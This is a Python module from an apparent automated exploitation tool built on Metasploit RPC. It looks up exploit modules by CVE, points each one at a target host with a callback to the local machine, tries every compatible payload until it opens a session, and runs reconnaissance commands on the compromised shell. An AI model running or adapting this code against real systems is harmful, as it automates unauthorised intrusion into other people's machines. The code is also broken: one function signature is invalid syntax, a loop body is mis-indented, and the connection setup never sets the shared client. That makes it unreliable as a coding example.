import socket
from dataclasses import dataclass
from time import sleep
from typing import Any, Dict, List

from pymetasploit3.msfrpc import MsfRpcClient

from modules.searchvuln import VulnerableSoftware

client = None

def initialize_msf_client(password: str, log, args) -> None:
    try:
        client = MsfRpcClient(password, ssl=True)
        log_msg = "Connected to Metasploit RPC server."
        if args.tag:
            log_msg += " - Exploit"
        log.logger("info", log_msg)
    except Exception as e:
        log_msg = f"Failed to connect to Metasploit RPC server: {e}"
        if args.tag:
            log_msg += " - Exploit"
        log.logger("error", log_msg)


@dataclass
class MetasploitVulnerability:
    name: str
    fullname: str
    type: str


def search_metasploit(keyword: str, log, args) -> List[MetasploitVulnerability]:
    """
    Searches Metasploit for exploits related to the given keyword.

    Args:
        keyword (str): The keyword to search for.

    Returns:
        list: A list of MetasploitVulnerability objects representing the exploits.
    """
    exploits = []
    results = client.modules.search(keyword)

    for result in results:
        if result['type'] == 'exploit':
            exploits.append(MetasploitVulnerability(
                name=result['name'],
                fullname=result['fullname'],
                type=result['type']
            ))

    if args.max_exploits and len(exploits) > args.max_exploits:
        exploits = exploits[:args.max_exploits]
        log_msg = f"Using the first {args.max_exploits} exploits for keyword '{keyword}'"
        if args.tag:
            log_msg += " - Exploit"
        log.logger("info", log_msg)

    log_msg = f"Found {len(exploits)} exploits for keyword '{keyword}'"
    if args.tag:
        log_msg += " - Exploit"
    log.logger("info", log_msg)

    return exploits


def combined_metasploit_search(vulnerability: VulnerableSoftware, log, args) -> List < MetasploitVulnerability:
    """
    Generates keywords from the vulnerability and searches Metasploit for related exploits.

    Args:
        vulnerability (VulnerableSoftware): The vulnerability to generate keywords from.
        log: Logger object for logging.

    Returns:
        list: A list of MetasploitVulnerability objects representing the exploits.
    """
    keywords = set(vulnerability.CVEs + [vulnerability.title])
    all_exploits = []

    for keyword in keywords:
        exploits = []
    results = client.modules.search(keyword)
    for result in results:
        if result['type'] == 'exploit':
         exploits.append(MetasploitVulnerability(
            name=result['name'],
            fullname=result['fullname'],
            type=result['type']
         ))

    if args.max_exploits and len(exploits) > args.max_exploits:
        exploits = exploits[:args.max_exploits]
    log_msg = f"Using the first {args.max_exploits} exploits for keyword '{keyword}'"
    if args.tag:
        log_msg += " - Exploit"
    log.logger("info", log_msg)

    log_msg = f"Found {len(exploits)} exploits for keyword '{keyword}'"
    if args.tag:
        log_msg += " - Exploit"
    log.logger("info", log_msg)

    all_exploits.extend(exploits)

    return all_exploits


def exploit_vulnerability(vulnerability: VulnerableSoftware, target: str, log, args) -> None:
    """
    Exploit a given vulnerability on the target.

    :param vulnerability: A VulnerableSoftware object containing vulnerability details.
    :param target: The target IP address or hostname.
    :param log: Logger object for logging.
    """
    log_msg = f"Searching for Metasploit modules related to: {vulnerability.title}"
    if args.tag:
        log_msg += " - Metasploit"
    log.logger("info", log_msg)

    exploit_names = combined_metasploit_search(vulnerability, log, args)

    for exploit in exploit_names:
        log_msg = f"Using exploit module {exploit.fullname} on {target}"
        if args.tag:
            log_msg += " - Exploit"
        log.logger("info", log_msg)

        global client
        exploit_module = client.modules.use('exploit', exploit.fullname)
        hostname = socket.gethostname()
        IPAddrUser = socket.gethostbyname(hostname)

        if 'LHOST' in exploit_module.options:
            exploit_module['LHOST'] = IPAddrUser
        if 'RHOSTS' in exploit_module.options:
            exploit_module['RHOSTS'] = target

        compatible_payloads = exploit_module.targetpayloads()

        log_msg = f"Compatible payloads for exploit {exploit.fullname}: {compatible_payloads}"
        if args.tag:
            log_msg += " - Exploit"
        log.logger("info", log_msg)

        for payload_name in compatible_payloads:
            try:
                log_msg = f"Executing payload {payload_name} with exploit {exploit.fullname}"
                if args.tag:
                    log_msg += " - Exploit"
                log.logger("info", log_msg)

                payload = client.modules.use('payload', payload_name)
                exploit_module.execute(payload=payload)
                sleep(2)  # Wait for the session to be created
                sessions = client.sessions.list

                if sessions:
                    session_id = max(sessions.keys())
                    shell = client.sessions.session(session_id)
                    commands = ['whoami', 'uname -a', 'id']

                    for command in commands:
                        shell.write(command)
                        response = shell.read()
                        log_msg = f"Command: {command}\nResponse: {response}"
                        if args.tag:
                            log_msg += " - Exploit"
                        log.logger("info", log_msg)

                    return  # Exit once a session is created

                log_msg = f"Failed to create session for exploit {exploit.fullname} using payload {payload_name}"
                if args.tag:
                    log_msg += " - Exploit"
                log.logger("error", log_msg)

            except Exception as e:
                log_msg = f"Failed to execute payload {payload_name}: {e}"
                if args.tag:
                    log_msg += " - Exploit"
                log.logger("error", log_msg)
                continue


def exploit_vulnerabilities(vulnerabilities: List[VulnerableSoftware], target: str, log, console, args) -> None:
    """
    Exploit a list of vulnerabilities on the target.

    :param vulnerabilities: A list of VulnerableSoftware objects containing vulnerability details.
    :param target: The target IP address or hostname.
    :param log: Logger object for logging.
    :param console: Rich console object for displaying status.
    """
    exploited_cves = set()

    for vulnerability in vulnerabilities:
        if vulnerability.CVEs[0] in exploited_cves:
            continue
        exploited_cves.add(vulnerability.CVEs[0])
        exploit_names = combined_metasploit_search(vulnerability, log, args)
        for exploit in exploit_names:
            with console.status(f"[white]Exploiting[/white] [red]{exploit.fullname}[/red] [white]...[/white]",
                                spinner="bouncingBar"):
                exploit_vulnerability(vulnerability, target, log, args)
                sleep(1)  # Adding a delay to ensure proper logging and execution
